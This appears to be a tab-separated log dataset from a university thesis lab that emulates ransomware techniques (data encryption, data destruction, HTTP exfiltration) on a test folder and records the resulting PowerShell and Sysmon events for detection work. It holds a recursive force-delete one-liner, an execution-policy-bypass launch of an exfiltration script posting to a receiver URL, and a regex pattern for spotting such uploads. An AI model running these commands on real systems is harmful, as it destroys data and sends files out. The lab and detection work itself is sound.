2026-06-24T12:52:53.103Z	P3	TEC-007	T1486	TEC-007 Data Encrypted for Impact	TEC007_DataEncryptedForImpact_4104	LT29.ait.us.es	Microsoft-Windows-PowerShell/Operational	param( [string]$TargetPath = "", [string]$OutputDir = "" ) Set-StrictMode -Version Latest $ErrorActionPreference = "Stop" $BasePath = $env:TFM_BASEPATH if ([string]::IsNullOrWhiteSpace($BasePath)) { $BasePath = "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas" } $env:TFM_BASEPATH = $BasePath if ([string]::IsNullOrWhiteSpace($TargetPath)) { $TargetPath = Join-Path $BasePath "DUMB_LAB" } if ([string]::IsNullOrWhiteSpace($OutputDir)) { $OutputDir = $PSScriptRoot } if (-not (Test-Path -LiteralPath $TargetPath)) { throw "TargetPath does not exist: $TargetPath" } New-Item -ItemType Directory -Force -Path $OutputDir | Out-Null $TxtFile = Join-Path $OutputDir "lista_archivos.txt" $CsvFile = Join-Path $OutputDir "lista_archivos.csv" $files = @( Get-ChildItem -LiteralPath $TargetPath -Recurse -File -ErrorAction Stop | Where-Object { $_.Extension -ne ".aes" } | Sort-Object FullName ) $files ...	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	4104	PowerShell 4104	05_LOGS\Validas\Prueba_24_06_2026\TEC007_DataEncryptedForImpact_4104-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:53.660Z	P3	TEC-007	T1486	TEC-007 Data Encrypted for Impact	TEC007_DataEncryptedForImpact_4104	LT29.ait.us.es	Microsoft-Windows-PowerShell/Operational	{ $_.Extension -ne ".aes" }	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	4104	PowerShell 4104	05_LOGS\Validas\Prueba_24_06_2026\TEC007_DataEncryptedForImpact_4104-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:55.524Z	P3	TEC-007	T1486	TEC-007 Data Encrypted for Impact	TEC007_DataEncryptedForImpact_4104	LT29.ait.us.es	Microsoft-Windows-PowerShell/Operational	param( [string]$WorkDir = "", [string]$ListFile = "", [string]$PasswordFile = "", [int]$MaxFiles = 25 ) Set-StrictMode -Version Latest $ErrorActionPreference = "Stop" $BasePath = $env:TFM_BASEPATH if ([string]::IsNullOrWhiteSpace($BasePath)) { $BasePath = "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas" } $env:TFM_BASEPATH = $BasePath if ([string]::IsNullOrWhiteSpace($WorkDir)) { $WorkDir = Join-Path $BasePath "DUMB_LAB" } if ([string]::IsNullOrWhiteSpace($ListFile)) { $ListFile = Join-Path $PSScriptRoot "lista_archivos.csv" } if ([string]::IsNullOrWhiteSpace($PasswordFile)) { $PasswordFile = Join-Path $PSScriptRoot "password.txt" } if (-not (Test-Path -LiteralPath $WorkDir)) { throw "WorkDir does not exist: $WorkDir" } if (-not (Test-Path -LiteralPath $ListFile)) { throw "ListFile does not exist: $ListFile" } if (-not (Test-Path -LiteralPath $PasswordFile)) { Set-Content -Litera...	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	4104	PowerShell 4104	05_LOGS\Validas\Prueba_24_06_2026\TEC007_DataEncryptedForImpact_4104-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:55.848Z	P3	TEC-007	T1486	TEC-007 Data Encrypted for Impact	TEC007_DataEncryptedForImpact_4104	LT29.ait.us.es	Microsoft-Windows-PowerShell/Operational	{ $_.FullName -and ($_.FullName -like "$WorkDir*") -and (Test-Path -LiteralPath $_.FullName) -and ($_.FullName -notlike "*.aes") }	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	4104	PowerShell 4104	05_LOGS\Validas\Prueba_24_06_2026\TEC007_DataEncryptedForImpact_4104-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:53:42.608Z	P3	TEC-008	T1485	TEC-008 Data Destruction	TEC008_DataDestruction_4104	LT29.ait.us.es	Microsoft-Windows-PowerShell/Operational	$target = 'C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\DUMB_LAB'; Write-Host 'TEC008_OK'; Get-ChildItem $target -Recurse -File | ForEach-Object { Remove-Item $_.FullName -Force }; Start-Sleep 3	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	4104	PowerShell 4104	05_LOGS\Validas\Prueba_24_06_2026\TEC008_DataDestruction_4104-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:21.811Z	P3	TEC-009	T1048.003 context	TEC-009 receiver network context	TEC009_HTTP_Network_Sysmon_Context	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	{ "RuleName": "-", "UtcTime": "2026-06-13 23:16:48.749", "ProcessGuid": "6BC49A7D-CAF5-6A3B-A366-000000009801", "ProcessId": 6232, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "User": "LT29\\seguridad", "Protocol": "tcp", "Initiated": true, "SourceIsIpv6": false, "SourceIp": "192.168.1.143", "SourceHostname": "LT29.ait.us.es", "SourcePort": 64583, "SourcePortName": "-", "DestinationIsIpv6": false, "DestinationIp": "192.168.1.129", "DestinationHostname": "-", "DestinationPort": 8088, "DestinationPortName": "-" }	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	3	Sysmon ID 3	05_LOGS\Validas\Prueba_24_06_2026\TEC009_HTTP_Network_Sysmon_Context-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:21.811Z	P3	TEC-009	T1048.003 context	TEC-009 receiver network context	TEC009_HTTP_Network_Sysmon_Context	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	{ "RuleName": "-", "UtcTime": "2026-06-13 23:16:48.749", "ProcessGuid": "6BC49A7D-CAF5-6A3B-A366-000000009801", "ProcessId": 6232, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "User": "LT29\\seguridad", "Protocol": "tcp", "Initiated": true, "SourceIsIpv6": false, "SourceIp": "192.168.1.143", "SourceHostname": "LT29.ait.us.es", "SourcePort": 64583, "SourcePortName": "-", "DestinationIsIpv6": false, "DestinationIp": "192.168.1.129", "DestinationHostname": "-", "DestinationPort": 8088, "DestinationPortName": "-" }	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	3	Sysmon ID 3	05_LOGS\Validas\Prueba_24_06_2026\TEC009_HTTP_Network_Sysmon_Context-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:21.811Z	P3	TEC-009	T1048.003 context	TEC-009 receiver network context	TEC009_HTTP_Network_Sysmon_Context	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	{ "RuleName": "-", "UtcTime": "2026-06-13 23:16:48.749", "ProcessGuid": "6BC49A7D-CAF5-6A3B-A366-000000009801", "ProcessId": 6232, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "User": "LT29\\seguridad", "Protocol": "tcp", "Initiated": true, "SourceIsIpv6": false, "SourceIp": "192.168.1.143", "SourceHostname": "LT29.ait.us.es", "SourcePort": 64583, "SourcePortName": "-", "DestinationIsIpv6": false, "DestinationIp": "192.168.1.129", "DestinationHostname": "-", "DestinationPort": 8088, "DestinationPortName": "-" }	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	3	Sysmon ID 3	05_LOGS\Validas\Prueba_24_06_2026\TEC009_HTTP_Network_Sysmon_Context-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:21.811Z	P3	TEC-009	T1048.003 context	TEC-009 receiver network context	TEC009_HTTP_Network_Sysmon_Context	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	{ "RuleName": "-", "UtcTime": "2026-06-13 23:16:48.749", "ProcessGuid": "6BC49A7D-CAF5-6A3B-A366-000000009801", "ProcessId": 6232, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "User": "LT29\\seguridad", "Protocol": "tcp", "Initiated": true, "SourceIsIpv6": false, "SourceIp": "192.168.1.143", "SourceHostname": "LT29.ait.us.es", "SourcePort": 64583, "SourcePortName": "-", "DestinationIsIpv6": false, "DestinationIp": "192.168.1.129", "DestinationHostname": "-", "DestinationPort": 8088, "DestinationPortName": "-" }	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	3	Sysmon ID 3	05_LOGS\Validas\Prueba_24_06_2026\TEC009_HTTP_Network_Sysmon_Context-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:20.862Z	P3	TEC-009	T1074.001 / T1560.001 / T1048.003 context	TEC-009 HTTP upload process context	TEC009_HTTP_Upload_Sysmon_Process_Context	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\exfiltracion_v3.ps1" -ReceiverUrl "http://192.168.1.129:8088/upload" -TimeoutSec 60 -EnableUpload -KeepArtifacts	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC009_HTTP_Upload_Sysmon_Process_Context-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:20.862Z	P3	TEC-009	T1074.001 / T1560.001 / T1048.003 context	TEC-009 HTTP upload process context	TEC009_HTTP_Upload_Sysmon_Process_Context	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\exfiltracion_v3.ps1" -ReceiverUrl "http://192.168.1.129:8088/upload" -TimeoutSec 60 -EnableUpload -KeepArtifacts	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC009_HTTP_Upload_Sysmon_Process_Context-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:37.369Z	P3	TEC-009	T1074.001 / T1560.001 / T1048.003	TEC-009 Controlled HTTP ZIP Upload	TEC009_HTTP_ZIP_Upload_4104	LT29.ait.us.es	Microsoft-Windows-PowerShell/Operational	{ $message = "" if ($null -ne $_ -and $_.PSObject.Properties.Name -contains "Message" -and $null -ne $_.Message) { $message = [string]$_.Message } $message -match "Invoke-WebRequest|application/zip|\-InFile|\-Method\s+POST|exfiltracion_v3" }	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	4104	PowerShell 4104	05_LOGS\Validas\Prueba_24_06_2026\TEC009_HTTP_ZIP_Upload_4104-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
